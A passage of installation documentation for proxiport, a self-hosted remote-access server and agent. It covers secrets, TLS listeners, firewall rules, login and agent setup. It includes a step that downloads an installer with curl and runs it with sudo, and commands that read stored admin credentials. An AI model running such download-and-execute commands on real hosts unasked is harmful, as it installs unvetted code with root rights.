sudo chown -R root:root /usr/share/proxiport/docroot
sudo chmod -R u=rwX,go=rX /usr/share/proxiport/docroot
# The example config ships doc_root commented out; enable it so the
# server serves the web UI.
sudo sed -i -E '/^\[api\]/,/^\[/ s|^[[:space:]]*#?[[:space:]]*doc_root[[:space:]]*=.*|  doc_root = "/usr/share/proxiport/docroot"|' \
    /etc/proxiport/proxiportd.conf

sudo useradd --system --home /var/lib/proxiport --shell /usr/sbin/nologin proxiport || true
# The config will hold key_seed, jwt_secret and both auth pairs.
sudo chown root:proxiport /etc/proxiport/proxiportd.conf
getent group ssl-cert >/dev/null || sudo groupadd --system ssl-cert
sudo install -d -o proxiport -g proxiport -m 0750 /var/lib/proxiport
sudo install -d -o proxiport -g proxiport -m 0750 /var/log/proxiport
sudo setcap CAP_NET_BIND_SERVICE=+eip /usr/bin/proxiportd
sudo systemctl daemon-reload

The ssl-cert group is listed in the unit's SupplementaryGroups so the daemon can read certbot/manual TLS keys — systemd will not start the service if the group is missing. setcap ships in libcap2-bin (Debian/Ubuntu) or libcap (RHEL-family) if your base install lacks it.

Tarball installs do not generate secrets. /etc/proxiport/proxiportd.conf is the example config, and proxiportd refuses to start while any of these four settings still holds its published example value. Replace each one before you enable the service:

  • [server] key_seed ("<YOUR_SEED>"): the output of openssl rand -hex 32. Keep it fixed afterwards: it derives the server's SSH host key, which agents pin.
  • [server] auth ("clientAuth1:1234"): the first agent's <client-auth-id>:<password>, with a strong random password. The agent's auth setting uses the same pair.
  • [api] auth ("admin:foobaz"): the admin login, admin:<a strong password>.
  • [api] jwt_secret ("<YOUR_SECRET>"): a random string, for example openssl rand -base64 24.

Since no initial-admin-password or initial-client-auth file is written, the credentials to use under Log in and Configure the agent are the ones you set here.

docs.title: Building from source
docs.text:
If none of the published artefacts fit your platform — or you want a container image, which we do not publish — build from source:

go install github.com/proximile/proxiport/cmd/proxiportd@latest

The server needs CGO (CGO_ENABLED=1) for the embedded SQLite. The agent is pure Go.

go install builds the server binary only. The web UI is a separate build — npm install && npm run build in frontend/ writes the build/ directory that the packages ship as docroot — so point [api] doc_root at a copy of it (or at the docroot directory from a release tarball), or the API will answer while the browser gets nothing.

The version string is injected at release time via linker flags, so a plain go build / go install reports 0.0.0-src for proxiportd --version (and proxiport --version). That is expected — to stamp a real version into a source build, pass the ldflag yourself, with the version of the tag you checked out:

git checkout v0.12.0
go build -ldflags "-X github.com/proximile/proxiport/share.BuildVersion=0.12.0" \
  ./cmd/proxiportd

Stamp a semantic version (x.y.z, optionally with a -suffix), never a bare commit hash. An agent reports its version on every connection, and servers up to v0.11.1 refuse an agent whose version they cannot parse from its second connection onward — such an agent connects once and never reconnects. The agent logs an error at start when its build version would not parse.

docs.title: Quick setup with proxiport-setup
docs.text:
If this is a single-host install with a public hostname pointed at it, the proxiport-setup script bundled with the .deb / .rpm does everything below in one command:

sudo proxiport-setup --fqdn proxiport.example.com

It mirrors the upstream openrport curl-bash installer: takes --fqdn, --email, --api-port, --client-port, --client-url, --port-range, --totp / --no-2fa, --skip-nat (skip the public-IP check), --assume-yes and --show-secrets for unattended runs, and --uninstall; opens UFW or firewalld rules; rewrites proxiportd.conf to bind :80 for agents and :443 for the API; turns on built-in ACME if the hostname is publicly resolvable (or accepts --cert-file / --key-file for an existing PEM pair); creates a SQLite users/groups/group_details/clients_auth schema with a bcrypt-hashed random admin password; enables TOTP 2FA by default; starts proxiportd; and prints the admin URL and credentials.

If that fits your install, jump to Log in. If you want to lay it out by hand, read on — the remaining sections walk through exactly what the script automates.

docs.title: What just happened
docs.text:
The .deb / .rpm post-install ran the steps the operator otherwise has to do manually:

  • copied proxiportd.example.conf to /etc/proxiport/proxiportd.conf (mode 0640 root:proxiport, left alone if it already exists), then generated a random ECDSA key_seed, JWT signing secret, admin password, and first agent credential and wrote them in place of the example placeholders;
  • enabled [api] doc_root = "/usr/share/proxiport/docroot" in that seeded config, so the bundled web UI is served as soon as proxiportd starts;

  • recorded the admin and client-auth credentials in two files under /var/lib/proxiport/:

    /var/lib/proxiport/initial-admin-password   # SPA login
/var/lib/proxiport/initial-client-auth      # first agent's auth pair

    Both files are mode 0600 proxiport:proxiport — owned by the account the server runs as, so that it can destroy them. Read with sudo cat. They are shredded from disk the first time an admin logs in with a password, so retrieve them and store the credentials in a password manager before that first login.

    Before 0.10.0 they were 0640 root:proxiport, which the daemon could not open for writing — so the shred failed silently and the cleartext credentials stayed on disk. An upgrade re-owns any files it finds.

  • granted CAP_NET_BIND_SERVICE on /usr/bin/proxiportd so the unprivileged proxiport user can bind ports 80 and 443;

  • created the ssl-cert system group if it was missing (the unit lists it in SupplementaryGroups);
  • created /var/lib/proxiport (state) and /var/log/proxiport (logs) with proxiport ownership.

The server is not yet enabled. The seeded config binds the API to 127.0.0.1 only, so nothing is reachable from the network until the next step (or until you run proxiport-setup, which handles all of this in one shot).

At-rest field encryption is off by default, so the seeded totp_secret column, the vault, and the freshly generated key_seed / jwt_secret in the config are all stored unencrypted. To wrap them under a server-held key, configure a [key_provider] — see the [key_provider] section of proxiportd.example.conf, encrypting the config secrets, and Two-factor authentication.

docs.title: Pick a public listener
docs.text:
The seeded config leaves [api] address = "127.0.0.1:3000" so nothing is exposed off-box until you choose how TLS will be served. There are three working setups; pick one and edit /etc/proxiport/proxiportd.conf accordingly. Full walk-through with worked examples is in HTTPS.

Built-in ACME (easiest)Manual cert filesReverse proxy

Single-purpose host with a public DNS A record pointing at it and port 443 reachable from the internet, so Let's Encrypt can complete its TLS-ALPN-01 challenge against the API listener. proxiportd obtains and renews the certificate itself. If the API cannot be on 443, see HTTPS for the HTTP-01 alternative ([server] acme_http_port).

[api]
  address     = "0.0.0.0:443"
  base_url    = "https://proxiport.example.com"
  enable_acme = true

Bring your own cert + key (certbot --manual, internal CA, anything PEM). Both files must be readable by the proxiport system user.

[api]
  address   = "0.0.0.0:443"
  base_url  = "https://proxiport.example.com"
  cert_file = "/etc/proxiport/tls/fullchain.pem"
  key_file  = "/etc/proxiport/tls/privkey.pem"

nginx / Caddy / Traefik terminates TLS upstream and forwards plain HTTP to proxiportd over loopback. Keep address = "127.0.0.1:3000" in the seeded config and point your proxy at it. See HTTPS for the directives each proxy needs for the WebSocket upgrade.

docs.title: Open the firewall
docs.text:
Wherever your server runs there is probably one host-level firewall and one cloud-level firewall. Both need port 80 (for the agent listener) and 443 (for the TLS API, which also carries built-in ACME's validation), unless you went with the reverse-proxy option.

UFW (Ubuntu)firewalld (RHEL / Fedora)DigitalOcean / AWS / GCP 
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp

sudo firewall-cmd --add-service=http  --permanent
sudo firewall-cmd --add-service=https --permanent
sudo firewall-cmd --reload

On hyperscalers the host firewall above only opens the kernel — the cloud's network firewall is what the public internet sees. Add inbound TCP rules for 80 and 443 to the droplet's Cloud Firewall (DO), the instance's Security Group (AWS), or the VPC firewall (GCP).

docs.title: Enable the service
docs.text:
sudo systemctl enable --now proxiportd
sudo systemctl status proxiportd

If the unit fails to start, journalctl -u proxiportd -n 50 shows why — the most common causes are an [api] address that's already in use, a base_url whose hostname does not resolve, or cert_file / key_file paths the proxiport user cannot read.

docs.title: Log in
docs.text:
On a package install, read the random admin password generated at install time (a tarball install uses the [api] auth password you set yourself):

sudo cat /var/lib/proxiport/initial-admin-password

Open https://<your-host>/ in a browser and sign in, then change the admin password. How depends on how the server was set up. If you ran proxiport-setup, the admins live in a user database: go to Settings → Users, edit admin and set a new password. With the seeded package config there is a single [api] auth = "admin:..." pair, which can't be changed from the web UI: edit that line in /etc/proxiport/proxiportd.conf and run sudo systemctl restart proxiportd. To manage passwords from the Users page instead, switch to auth_file or auth_user_table (see API authentication).

The Info page is where the host-key fingerprint and the Connect-URL list live — both are needed when configuring agents.

docs.title: Requirements
docs.text:
• Linux, macOS, Windows, FreeBSD, OpenBSD or NetBSD (see the platform list under Install below).
  • Outbound TCP from the agent host to the server's [server] listener — port 80 in the seeded default. Agents never accept inbound connections, so no firewall changes are needed on their side.

docs.title: Install
docs.text:
The fastest way to bring up a new agent is the pairing service at pairing.proxiport.net: the operator posts the agent's credentials, the service mints a one-shot pairing code, the agent host downloads and runs the installer

curl https://pairing.proxiport.net/<code> > proxiport-installer.sh
sudo sh proxiport-installer.sh

and the installer drops a working binary plus proxiport.conf into place. Installer switches go on the second line, for example sudo sh proxiport-installer.sh -o. Source for the pairing service: https://github.com/proximile/proxiport-pairing.

When you generate a pairing code from the web UI, the server brokers the request: the browser posts to POST /api/v1/pairing on your own server (same origin, using your session), and the server forwards it to the pairing service. This means pairing works from any deployment's own hostname, and your server needs outbound network access to pairing_url (the pairing.proxiport.net default, or your own instance). Set pairing_url = "" in the [server] section to turn pairing off. The Add credential dialog on Settings → Client Access then closes once the credential is created and skips the pairing step, and the server answers POST /api/v1/pairing with 409 ERR_CODE_PAIRING_DISABLED.

To bring an agent up over Tor or a VPN from the start, the installer takes -o and -e; see Installing with the pairing script.

The agent ships in the same three package formats as the server, plus tarballs for a wider platform list: Linux (amd64, arm64, i386, armv6, armv7, riscv64, ppc64, ppc64le, loong64, s390x, and mips/mipsle/mips64/mips64le hard- and softfloat), macOS (amd64, arm64), Windows (amd64, as a zip), FreeBSD (amd64, arm64, armv6, armv7, i386), OpenBSD (amd64, arm64, i386) and NetBSD (amd64, arm64). .deb and .rpm are published for every Linux variant.

docs.text:

        | sed -n 's/.*"tag_name": *"\([^"]*\)".*/\1/p')

sudo install -m 0755 proxiport /usr/bin/proxiport

sudo install -m 0644 proxiport.service /lib/systemd/system/proxiport.service

# The agent's own account and directories. `proxiport-agent` is NOT the
# server's `proxiport`: the agent executes operator-supplied commands as its
# own uid, so sharing one account would put it inside the server's trust
# boundary on any host carrying both.
sudo useradd --system --home /var/lib/proxiport-agent \
             --shell /usr/sbin/nologin proxiport-agent || true
sudo install -d -o proxiport-agent -g proxiport-agent -m 0750 /var/lib/proxiport-agent
sudo install -d -o proxiport-agent -g proxiport-agent -m 0750 /var/log/proxiport-agent
